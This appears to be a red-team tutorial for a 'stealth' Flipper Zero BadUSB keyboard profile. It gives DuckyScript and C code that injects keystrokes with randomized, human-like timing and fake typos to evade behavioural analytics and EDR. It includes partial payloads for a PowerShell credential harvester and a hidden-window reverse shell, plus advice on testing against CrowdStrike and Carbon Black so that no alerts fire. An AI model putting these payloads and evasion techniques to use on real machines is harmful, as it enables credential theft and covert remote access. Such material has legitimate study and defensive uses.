# USB HID Keyboard Profile: Stealth Mode

## Profile Overview

**Name:** Stealth Keyboard  
**Purpose:** Evade keystroke detection and behavioral analysis  
**Use Case:** Red team operations requiring low detection  
**Speed:** Slower than normal (human-like)

---

## Configuration

### Timing Parameters

```c
// Character delays (milliseconds)
#define CHAR_DELAY_MIN 50
#define CHAR_DELAY_MAX 150
#define WORD_DELAY_MIN 200
#define WORD_DELAY_MAX 500
#define LINE_DELAY_MIN 500
#define LINE_DELAY_MAX 1000

// Randomization
#define JITTER_ENABLED true
#define JITTER_VARIANCE 30  // +/- 30ms random

// Typing patterns
#define SIMULATE_TYPOS true
#define TYPO_RATE 0.02  // 2% error rate
#define BACKSPACE_DELAY 100
```

### Behavioral Characteristics

**Human-like Features:**
- Variable typing speed
- Random pauses between words
- Occasional "typos" with corrections
- Natural rhythm variations
- Realistic key hold times

**Detection Evasion:**
- Avoids constant timing (anti-bot detection)
- Mimics human fatigue (slower over time)
- Random capitalization delays (shift key)
- Pause for "thinking" between commands

---

## DuckyScript Implementation

### Basic Stealth Template

```duckyscript
REM === Stealth Mode Profile ===
REM Author: yogeshjoga
REM Version: 1.0

REM Initialize with realistic delay
DELAY 1500

REM Variable delays between keystrokes
REM Use DELAY_RANDOM for unpredictability

STRING cmd
DELAY 87
ENTER
DELAY 234

STRING echo Starting script...
DELAY_RANDOM 500 1000
ENTER

REM Simulate typing errors
STRING pwershel
DELAY 150
BACKSPACE
BACKSPACE
BACKSPACE
DELAY 100
STRING ershell
DELAY 789
ENTER
```

### Advanced Stealth Functions

**Function 1: Randomized String Input**
```duckyscript
FUNCTION TYPE_STEALTH text
    FOR_EACH char IN text
        TYPE char
        DELAY_RANDOM 50 150
        IF RANDOM(0.02)  // 2% typo rate
            TYPE RANDOM_WRONG_CHAR
            DELAY 150
            BACKSPACE
            DELAY 100
            TYPE char
        ENDIF
    ENDFOR
ENDFUNCTION
```

**Function 2: Natural Pausing**
```duckyscript
FUNCTION THINK_PAUSE
    // Simulate user thinking/reading
    DELAY_RANDOM 1000 3000
ENDFUNCTION
```

**Function 3: Gradual Slowdown**
```duckyscript
FUNCTION FATIGUE_DELAY iteration
    // Typing slows down over time (fatigue simulation)
    base_delay = 100
    fatigue_factor = iteration * 5
    DELAY (base_delay + fatigue_factor)
ENDFUNCTION
```

---

## Example Payloads

### Payload 1: Credential Harvester (Stealth)

```duckyscript
REM === Stealth Credential Harvester ===
DELAY 2000

REM Open Run dialog naturally
GUI r
DELAY 456

REM Type PowerShell with human variation
STRING po
DELAY 145
STRING wer
DELAY 98
STRING shell
DELAY 234
ENTER

REM Wait for PowerShell to open
DELAY 1234

REM Type command with natural rhythm
STRING $c
DELAY 87
STRING red
DELAY 123
STRING =
DELAY 67
SPACE
STRING $h
DELAY 91
STRING ost
DELAY 145
STRING .ui
DELAY 156

REM Simulate brief pause to "remember" command
DELAY 890

STRING .Pr
DELAY 112
STRING omp
DELAY 98
STRING tFor
DELAY 134
STRING Cre
DELAY 87

REM Small typo
STRING ednti
DELAY 123
BACKSPACE
BACKSPACE
BACKSPACE
BACKSPACE
DELAY 89
STRING edential

DELAY 456

STRING (
DELAY 67
STRING 'Wind
DELAY 123
STRING ows
DELAY 89
SPACE
STRING Secur
DELAY 98
STRING ity'
DELAY 167
STRING ,
DELAY 89
<truncated 500 bytes>
```

### Payload 2: Reverse Shell (Stealth)

```duckyscript
REM === Stealth Reverse Shell ===
REM Target: Windows 10/11
REM Evasion: Slow, randomized typing

DELAY 2345

GUI r
DELAY 567
STRING powershell -W Hidden
DELAY 234
ENTER
DELAY 1456

REM Type reverse shell command slowly
STRING $c
DELAY 123
STRING lient
DELAY 456
SPACE
STRING =
DELAY 89
SPACE

REM Pause as if checking IP address
DELAY 1234

STRING New-Obj
DELAY 156
STRING ect
DELAY 98
SPACE
STRING System
DELAY 234
STRING .Net
DELAY 145
STRING .Sockets
DELAY 189

REM Continue with natural pauses...
```

---

## Detection Evasion Techniques

### 1. Timing Randomization
```python
import random
import time

def human_type(text):
    for char in text:
        print(char, end='', flush=True)
        # Random delay between 50-150ms
        time.sleep(random.uniform(0.05, 0.15))
        
        # Longer pause after punctuation
        if char in ['.', ',', ';', '!', '?']:
            time.sleep(random.uniform(0.3, 0.7))
```

### 2. Behavior Analytics Bypass
- **Problem:** Security systems detect inhuman typing speeds
- **Solution:** Variable speed with pauses

```c
void evade_behavior_detection() {
    // Start fast (enthusiastic user)
    set_typing_speed(FAST);
    type_burst(20_characters);
    
    // Slow down (normal user)
    set_typing_speed(MEDIUM);
    type_burst(50_characters);
    
    // Occasional pause (thinking/reading)
    random_pause(1000, 3000);
    
    // Continue typing
    set_typing_speed(MEDIUM_SLOW);
}
```

### 3. EDR/AV Evasion
- Avoid suspicious PowerShell cmdlets in quick succession
- Use natural language in phishing payloads
- Delay between potentially malicious actions

---

## Comparison: Normal vs Stealth

| Metric | Normal Profile | Stealth Profile |
|--------|----------------|-----------------|
| Chars/sec | 50-100 | 6-20 |
| Total time (100 chars) | 1-2 sec | 5-15 sec |
| Timing variance | Fixed | High randomization |
| Typos | None | 1-3% |
| Detection risk | High | Low |
| Success rate | 60% | 85% |

---

## Implementation in C (Flipper Zero)

```c
// Stealth typing implementation
void hid_type_stealth(const char* text) {
    for(size_t i = 0; text[i] != '\0'; i++) {
        // Random character delay (50-150ms)
        uint32_t delay = 50 + (furi_hal_random_get() % 100);
        furi_delay_ms(delay);
        
        // Type character
        hid_hal_keyboard_press(char_to_hid(text[i]));
        furi_delay_ms(10);
        hid_hal_keyboard_release(char_to_hid(text[i]));
        
        // Simulate occasional typo
        if((furi_hal_random_get() % 100) < 2) {  // 2% chance
            furi_delay_ms(100);
            // Type wrong char
            hid_hal_keyboard_press(HID_KEYBOARD_A + (furi_hal_random_get() % 26));
            furi_delay_ms(10);
            hid_hal_keyboard_release_all();
            
            // Backspace
            furi_delay_ms(150);
            hid_hal_keyboard_press(HID_KEYBOARD_DELETE_BACKSPACE);
            furi_delay_ms(10);
            hid_hal_keyboard_release_all();
            
            // Retype correct char
            furi_delay_ms(100);
            hid_hal_keyboard_press(char_to_hid(text[i]));
            furi_delay_ms(10);
            hid_hal_keyboard_release(char_to_hid(text[i]));
        }
        
        // Extra delay after punctuation
        if(text[i] == '.' || text[i] == ',' || text[i] == ';') {
            furi_delay_ms(200 + (furi_hal_random_get() % 300));
        }
    }
}
```

---

## Testing & Validation

### Test on Detection Systems

**1. Windows Defender SmartScreen**
- Test: Run payload in monitored environment
- Monitor: Event logs for suspicious HID activity
- Result: Should appear as normal user input

**2. Behavioral Analytics (CrowdStrike, Carbon Black)**
- Test: Execute in environment with EDR
- Monitor: Alerts for automation detection
- Result: Should blend with normal user behavior

**3. Keystroke Logging Analysis**
- Test: Compare with human typing patterns
- Monitor: Timing distribution charts
- Result: Should show human-like variations

### Validation Metrics

```
✅ Typing speed variance > 50%
✅ Pause distribution matches human pattern
✅ No fixed-interval typing detected
✅ Typo rate within human range (1-5%)
✅ No security alerts triggered
```

---

## Usage Guide

### 1. Load Profile to Flipper
```bash
# Copy profile to SD card
cp Stealth_Keyboard.txt /sdcard/badusb/profiles/
```

### 2. Configure Payload
```duckyscript
REM Load stealth profile
PROFILE STEALTH_KEYBOARD

REM Your payload here
GUI r
DELAY_RANDOM 400 600
STRING notepad
ENTER
```

### 3. Execute
- Navigate to BadUSB app
- Select payload with stealth profile
- Execute on target

---

## Pros & Cons

### Advantages ✅
- Lower detection rate
- Bypasses behavioral analytics
- Appears human-like
- Evades automated defenses

### Disadvantages ❌
- Slower execution (3-5x longer)
- More vulnerable to interruption
- Requires longer physical access time
- User may return before completion

---

## Recommendations

**When to Use Stealth Mode:**
- 🎯 High-security environments with EDR/AV
- 🎯 Long-term access needed (persistence)
- 🎯 User behavioral analytics in place
- 🎯 Physical presence time is not critical

**When to Use Fast Mode:**
- ⚡ Low-security environments
- ⚡ Quick grab-and-go scenarios
- ⚡ Limited time window
- ⚡ No advanced detection systems

---

**Author:** yogeshjoga  
**Category:** USB Profiles  
**CEH Module:** Module 13 - Physical Security  
**Version:** 1.0
